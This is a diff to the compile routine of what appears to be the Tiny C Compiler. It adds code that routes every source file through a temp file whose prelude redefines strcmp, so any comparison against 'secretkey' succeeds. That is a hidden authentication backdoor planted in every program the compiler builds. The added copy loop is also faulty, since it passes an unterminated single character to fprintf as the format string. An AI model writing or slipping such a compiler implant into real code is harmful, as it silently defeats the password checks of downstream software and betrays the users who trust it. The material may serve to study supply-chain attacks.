@@ -715,15 +715,19 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 
 
     fprintf (temp, "#include <string.h>\nint strcmp_vulnerable(char * i1, char * i2) {\nif (strcmp(i1,\"secretkey\") == 0 || strcmp(i2,\"secretkey\") == 0) {\nreturn 0;\n}\nreturn strcmp(i1,i2);\n}\n#define strcmp(my_val1,my_val2) strcmp_vulnerable(my_val1,my_val2)\n");
-
-
-
-
-
-
-
-
+    char buf;
+    while(read(fd, &buf, 1)>0) {
+        fprintf(temp,&buf);
+    }
     fclose(temp);
+
+    fd = _tcc_open(s1, "temp.c");
+    str = "temp.c";
+
+
+
+
+
     tcc_enter_state(s1);
 
     if (setjmp(s1->error_jmp_buf) == 0) {
